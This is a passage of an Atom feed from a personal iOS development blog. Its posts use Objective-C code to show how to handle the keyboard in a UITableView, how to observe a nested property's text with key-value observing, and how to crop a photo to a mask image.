    <summary type="html">&lt;p&gt;I’m doing with lot of projects, some projects are similar, thus I can just clone from the&lt;br&gt;existing project and rename it. But how to</summary>
        
      
    
    
    
    
    <category term="xcode" scheme="http://jslim.net/tags/xcode/"/>
    
  </entry>
  
  <entry>
    <title>iOS - handle keyboard in UITableView in UIViewController</title>
    <link href="http://jslim.net/blog/2014/12/09/ios-handle-keyboard-in-uitableview-in-uiviewcontroller/"/>
    <id>http://jslim.net/blog/2014/12/09/ios-handle-keyboard-in-uitableview-in-uiviewcontroller/</id>
    <published>2014-12-09T06:16:37.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Most of the time, we tend to put <code>textField</code> in a <code>tableView</code>, perhaps it is much simpler.</p><p>If your form in <code>UITableView</code> extends <code>UITableViewController</code>, then you can skip the post, <code>UITableViewController</code> will handle this issue for you.</p><p>But, in certain situations, we need to extends <code>UIViewController</code> and handle the keyboard with <code>UITableView</code> by our own.</p><p>The <strong>ViewController.m</strong> is subclass of <code>UIViewController</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UITableView</span> *tableView;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    _tableView = [[<span class="built_in">UITableView</span> alloc] init];</span><br><span class="line">    _tableView.translatesAutoresizingMaskIntoConstraints = <span class="literal">NO</span>;</span><br><span class="line">    _tableView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    _tableView.dataSource = <span class="keyword">self</span>;</span><br><span class="line">    _tableView.rowHeight = kTextFieldCellHeight;</span><br><span class="line">    _tableView.allowsSelection = <span class="literal">NO</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_tableView];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add constraint for the _tableView */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    [[<span class="built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(keyboardWillShow:) name:<span class="built_in">UIKeyboardWillShowNotification</span> object:<span class="literal">nil</span>];</span><br><span class="line">    [[<span class="built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(keyboardWillHide:) name:<span class="built_in">UIKeyboardWillHideNotification</span> object:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - keyboard notification</span></span><br><span class="line">- (<span class="type">void</span>)keyboardWillShow:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSDictionary</span> *userInfo = [notification userInfo];</span><br><span class="line">    <span class="built_in">CGSize</span> keyboardSize = [[userInfo objectForKey:<span class="built_in">UIKeyboardFrameBeginUserInfoKey</span>] <span class="built_in">CGRectValue</span>].size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    _tableView.tableFooterView = [[<span class="built_in">UIView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, keyboardSize.width, keyboardSize.height)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)keyboardWillHide:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 3.</span></span><br><span class="line">    _tableView.tableFooterView = <span class="literal">nil</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Register for keyboard notifications</li><li>When the keyboard shown, add footerView to that table and make sure the height is same as keyboard.<br><em>(when add in the footerView, the <code>contentSize</code> of the tableView is actually increase, so that<br>it has more room to scroll and the keyboard won’t block the content below)</em></li><li>When keyboard hide, remove the footerView, the tableView’s <code>contentSize</code> will then changed back to<br>it’s original height.</li></ol><h2 id="Update-13-Jan-2015"><a href="#Update-13-Jan-2015" class="headerlink" title="Update: 13 Jan, 2015"></a>Update: 13 Jan, 2015</h2><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)keyboardWillShow:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSDictionary</span> *userInfo = [notification userInfo];</span><br><span class="line">    <span class="built_in">CGSize</span> keyboardSize = [[userInfo objectForKey:<span class="built_in">UIKeyboardFrameBeginUserInfoKey</span>] <span class="built_in">CGRectValue</span>].size;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIEdgeInsets</span> contentInsets = <span class="built_in">UIEdgeInsetsMake</span>(<span class="number">0.0</span>, <span class="number">0.0</span>, keyboardSize.height, <span class="number">0.0</span>);</span><br><span class="line">    _signInTableView.contentInset = contentInsets;</span><br><span class="line">    _signInTableView.scrollIndicatorInsets = contentInsets;</span><br><span class="line">    </span><br><span class="line">    _signUpTableView.contentInset = contentInsets;</span><br><span class="line">    _signUpTableView.scrollIndicatorInsets = contentInsets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)keyboardWillHide:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">UIEdgeInsets</span> contentInsets = <span class="built_in">UIEdgeInsetsZero</span>;</span><br><span class="line">    _signInTableView.contentInset = contentInsets;</span><br><span class="line">    _signInTableView.scrollIndicatorInsets = contentInsets;</span><br><span class="line">    </span><br><span class="line">    _signUpTableView.contentInset = contentInsets;</span><br><span class="line">    _signUpTableView.scrollIndicatorInsets = contentInsets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This solution doesn’t need to care about the <code>tableFooterView</code>, but change it’s content inset instead.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Most of the time, we tend to put &lt;code&gt;textField&lt;/code&gt; in a &lt;code&gt;tableView&lt;/code&gt;, perhaps it is much simpler.&lt;/p&gt;
&lt;p&gt;If your form in</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>iOS - event listener to property of property</title>
    <link href="http://jslim.net/blog/2014/12/09/ios-event-listener-to-property-of-property/"/>
    <id>http://jslim.net/blog/2014/12/09/ios-event-listener-to-property-of-property/</id>
    <published>2014-12-09T06:00:38.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>What does it mean? Let’s look at the view hierarchy</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSView</span><br><span class="line"> |<span class="params">----</span> titleLabel</span><br><span class="line"> |<span class="params">----</span> <span class="string">...</span></span><br></pre></td></tr></table></figure><p>In this case, I have a viewController that contain a property <strong>UILabel</strong> <code>titleLabel</code>. I want to perform some action upon the <code>text</code> changed.</p><p>i.e.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsView.titleLabel.text = <span class="string">@&quot;new text&quot;</span>;</span><br></pre></td></tr></table></figure><p>Now, add an event listener <em>(in iOS called observer)</em> to it’s text changed</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">self</span> addObserver:<span class="keyword">self</span> forKeyPath:<span class="string">@&quot;_titleLabel.text&quot;</span> options:<span class="built_in">NSKeyValueObservingOptionNew</span> | <span class="built_in">NSKeyValueObservingOptionOld</span> context:<span class="literal">nil</span>];</span><br></pre></td></tr></table></figure><p>you can add the line above to <code>init</code> method</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    [<span class="keyword">self</span> removeObserver:<span class="keyword">self</span> forKeyPath:<span class="string">@&quot;_titleLabel.text&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Don’t forget to remove it after the main view deallocated, otherwise the app will crash.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - observer</span></span><br><span class="line">-(<span class="type">void</span>)observeValueForKeyPath:(<span class="built_in">NSString</span> *)keyPath ofObject:(<span class="type">id</span>)object change:(<span class="built_in">NSDictionary</span> *)change context:(<span class="type">void</span> *)context</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ([keyPath isEqualToString:<span class="string">@&quot;_titleLabel.text&quot;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;the title text has been changed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Once the text changed, it will output the console</p><h3 id="Update-Jan-6-2015"><a href="#Update-Jan-6-2015" class="headerlink" title="Update Jan 6, 2015"></a>Update Jan 6, 2015</h3><p>The more proper way would be</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[_titleLabel addObserver:<span class="keyword">self</span> forKeyPath:<span class="string">@&quot;text&quot;</span> options:<span class="built_in">NSKeyValueObservingOptionNew</span> | <span class="built_in">NSKeyValueObservingOptionOld</span> context:<span class="literal">nil</span>];</span><br></pre></td></tr></table></figure><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)dealloc</span><br><span class="line">&#123;</span><br><span class="line">    [_titleLabel removeObserver:<span class="keyword">self</span> forKeyPath:<span class="string">@&quot;text&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - observer</span></span><br><span class="line">-(<span class="type">void</span>)observeValueForKeyPath:(<span class="built_in">NSString</span> *)keyPath ofObject:(<span class="type">id</span>)object change:(<span class="built_in">NSDictionary</span> *)change context:(<span class="type">void</span> *)context</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (object == _titleLabel) &#123;</span><br><span class="line">        <span class="keyword">if</span> ([keyPath isEqualToString:<span class="string">@&quot;text&quot;</span>]) &#123;</span><br><span class="line">            <span class="built_in">NSLog</span>(<span class="string">@&quot;the title text has been changed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="http://nshipster.com/key-value-observing/">Key-Value Observing</a></em></li><li><em><a href="http://stackoverflow.com/questions/24969523/simple-kvo-example">Simple KVO example</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;What does it mean? Let’s look at the view hierarchy&lt;/p&gt;
&lt;figure class=&quot;highlight jboss-cli&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>iOS - crop image based on a mask</title>
    <link href="http://jslim.net/blog/2014/12/08/ios-crop-image-based-on-a-mask/"/>
    <id>http://jslim.net/blog/2014/12/08/ios-crop-image-based-on-a-mask/</id>
    <published>2014-12-08T17:08:22.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I have a mask here <em>(the Sun Goku hair)</em>, and I want to put a face to this mask.</p><p><img src="/images/posts/2014-12-09-ios-crop-image-based-on-a-mask/mask.png" alt="mask"></p><h2 id="Setup-the-base-view"><a href="#Setup-the-base-view" class="headerlink" title="Setup the base view"></a>Setup the base view</h2><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;ViewController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> () &lt;<span class="title">UIActionSheetDelegate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIImageView</span> *maskView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIImageView</span> *cropImageView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIButton</span> *photoButton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">ViewController</span></span></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad &#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    </span><br><span class="line">    _maskView = [[<span class="built_in">UIImageView</span> alloc] initWithImage:[<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;sungoku&quot;</span>]];</span><br><span class="line">    _maskView.center = <span class="built_in">CGPointMake</span>(<span class="built_in">CGRectGetWidth</span>(<span class="keyword">self</span>.view.frame) / <span class="number">2.0</span>, (<span class="built_in">CGRectGetHeight</span>(<span class="keyword">self</span>.view.frame) / <span class="number">2.0</span>) - <span class="number">30</span>);</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_maskView];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// kCropFrame = the image frame</span></span><br><span class="line">    <span class="comment">// where _cropImageView is relative to self.view (not _maskView), thus have to adjust the frame</span></span><br><span class="line">    _cropImageView = [[<span class="built_in">UIImageView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="built_in">CGRectGetMinX</span>(kCropFrame) + <span class="built_in">CGRectGetMinX</span>(_maskView.frame), <span class="built_in">CGRectGetMinY</span>(kCropFrame) + <span class="built_in">CGRectGetMinY</span>(_maskView.frame), <span class="built_in">CGRectGetWidth</span>(kCropFrame), <span class="built_in">CGRectGetHeight</span>(kCropFrame))];</span><br><span class="line">    [<span class="keyword">self</span>.view insertSubview:_cropImageView belowSubview:_maskView];</span><br><span class="line">    </span><br><span class="line">    _photoButton = [<span class="built_in">UIButton</span> buttonWithType:<span class="built_in">UIButtonTypeCustom</span>];</span><br><span class="line">    _photoButton.frame = <span class="built_in">CGRectMake</span>(<span class="number">20</span>, <span class="built_in">CGRectGetMaxY</span>(_maskView.frame) + <span class="number">40</span>, <span class="built_in">CGRectGetWidth</span>(<span class="keyword">self</span>.view.frame) - <span class="number">40</span>, <span class="number">40</span>);</span><br><span class="line">    _photoButton.layer.cornerRadius = <span class="number">5</span>;</span><br><span class="line">    _photoButton.backgroundColor = [<span class="built_in">UIColor</span> colorWithRed:<span class="number">0.2</span> green:<span class="number">0.6</span> blue:<span class="number">0.8</span> alpha:<span class="number">1</span>];</span><br><span class="line">    _photoButton.titleLabel.textColor = [<span class="built_in">UIColor</span> whiteColor];</span><br><span class="line">    [_photoButton setTitle:<span class="string">@&quot;Photo&quot;</span> forState:<span class="built_in">UIControlStateNormal</span>];</span><br><span class="line">    [_photoButton addTarget:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(photoTapped:) forControlEvents:<span class="built_in">UIControlEventTouchUpInside</span>];</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_photoButton];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)didReceiveMemoryWarning &#123;</span><br><span class="line">    [<span class="variable language_">super</span> didReceiveMemoryWarning];</span><br><span class="line">    <span class="comment">// Dispose of any resources that can be recreated.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - event</span></span><br><span class="line">- (<span class="type">void</span>)photoTapped:(<span class="built_in">UIButton</span> *)sender</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">UIActionSheet</span> *actionSheet = [[<span class="built_in">UIActionSheet</span> alloc] initWithTitle:<span class="literal">nil</span></span><br><span class="line">                                                             delegate:<span class="keyword">self</span></span><br><span class="line">                                                    cancelButtonTitle:<span class="string">@&quot;Cancel&quot;</span></span><br><span class="line">                                               destructiveButtonTitle:<span class="literal">nil</span></span><br><span class="line">                                                    otherButtonTitles:<span class="string">@&quot;Take Photo&quot;</span>, <span class="string">@&quot;Choose Existing Photo&quot;</span>, <span class="literal">nil</span>];</span><br><span class="line">    [actionSheet showInView:<span class="keyword">self</span>.view];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIActionSheetDelegate</span></span><br><span class="line">- (<span class="type">void</span>)actionSheet:(<span class="built_in">UIActionSheet</span> *)actionSheet clickedButtonAtIndex:(<span class="built_in">NSInteger</span>)buttonIndex</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (buttonIndex == actionSheet.cancelButtonIndex) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">UIImagePickerController</span> *picker = [[<span class="built_in">UIImagePickerController</span> alloc] init];</span><br><span class="line">    picker.delegate = <span class="keyword">self</span>;</span><br><span class="line">    picker.allowsEditing = <span class="literal">YES</span>;</span><br><span class="line">    picker.sourceType = buttonIndex == <span class="number">1</span> ? <span class="built_in">UIImagePickerControllerSourceTypePhotoLibrary</span> : <span class="built_in">UIImagePickerControllerSourceTypeCamera</span>;</span><br><span class="line">    [<span class="keyword">self</span> presentViewController:picker animated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p>The code above create a simple view with a mask, button and a place holder for the cropped image.</p><p>Where the <code>kCropFrame</code> is a macro I define in <strong>pch</strong> file. This value I want to use it across multiple viewControllers.</p><p>i.e. <code>#define kCropFrame CGRectMake(45, 80, 95, 62)</code>.</p><p>The question here is “How do you know the number?”</p><ol><li>Open up the image, select the area that I wanted to crop <em>(get the <code>width</code> &amp; <code>height</code>)</em></li></ol><p><img src="/images/posts/2014-12-09-ios-crop-image-based-on-a-mask/crop-area.png" alt="select crop area"></p><ol start="2"><li>Drag all the way to top left <em>(get the position <code>x</code> &amp; <code>y</code>)</em></li></ol><p><img src="/images/posts/2014-12-09-ios-crop-image-based-on-a-mask/crop-area-xy.png" alt="get crop area position (top left)"></p><p>Now I got the <code>CGRect</code> value</p><h2 id="Crop-image-controller"><a href="#Crop-image-controller" class="headerlink" title="Crop image controller"></a>Crop image controller</h2><p><strong>CropViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import &lt;<span class="built_in">UIKit</span>/<span class="built_in">UIKit</span>.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">CropViewControllerDelegate</span> &lt;<span class="title">NSObject</span>&gt;</span></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)cropViewControllerDidCroppedImage:(<span class="built_in">UIImage</span> *)image;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CropViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UIScrollViewDelegate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">weak</span>) <span class="type">id</span>&lt;CropViewControllerDelegate&gt; delegate;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. </span></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIImage</span> *faceImage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><ol><li>Delegate method after cropping the image</li><li>Accept the raw image from parent viewController</li></ol><p><strong>CropViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;CropViewController.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CropViewController</span> ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIImageView</span> *maskImageView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIScrollView</span> *faceScrollView;</span><br><span class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>) <span class="built_in">UIImageView</span> *faceImageView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">CropViewController</span></span></span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)viewDidLoad &#123;</span><br><span class="line">    [<span class="variable language_">super</span> viewDidLoad];</span><br><span class="line">    <span class="keyword">self</span>.view.backgroundColor = [<span class="built_in">UIColor</span> whiteColor];</span><br><span class="line">    <span class="keyword">self</span>.title = <span class="string">@&quot;Crop&quot;</span>;</span><br><span class="line">    <span class="keyword">self</span>.navigationItem.leftBarButtonItem = [[<span class="built_in">UIBarButtonItem</span> alloc] initWithTitle:<span class="string">@&quot;Close&quot;</span> style:<span class="built_in">UIBarButtonItemStylePlain</span> target:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(closeTapped:)];</span><br><span class="line">    <span class="keyword">self</span>.navigationItem.rightBarButtonItem = [[<span class="built_in">UIBarButtonItem</span> alloc] initWithTitle:<span class="string">@&quot;Done&quot;</span> style:<span class="built_in">UIBarButtonItemStylePlain</span> target:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(doneTapped:)];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1.</span></span><br><span class="line">    _faceScrollView = [[<span class="built_in">UIScrollView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">    _faceScrollView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span> | <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span>;</span><br><span class="line">    _faceScrollView.delegate = <span class="keyword">self</span>;</span><br><span class="line">    _faceScrollView.showsHorizontalScrollIndicator = <span class="literal">NO</span>;</span><br><span class="line">    _faceScrollView.showsVerticalScrollIndicator = <span class="literal">NO</span>;</span><br><span class="line">    [<span class="keyword">self</span>.view addSubview:_faceScrollView];</span><br><span class="line">    </span><br><span class="line">    _faceImageView = [[<span class="built_in">UIImageView</span> alloc] initWithImage:_faceImage];</span><br><span class="line">    _faceScrollView.contentSize = _faceImageView.bounds.size;</span><br><span class="line">    _faceScrollView.maximumZoomScale = <span class="number">2</span>;</span><br><span class="line">    _faceScrollView.minimumZoomScale = _faceScrollView.frame.size.width  / _faceImageView.frame.size.width;;</span><br><span class="line">    _faceScrollView.zoomScale = _faceScrollView.minimumZoomScale;</span><br><span class="line">    [_faceScrollView addSubview:_faceImageView];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.a.</span></span><br><span class="line">    <span class="built_in">UIView</span> *overlayView = [[<span class="built_in">UIView</span> alloc] 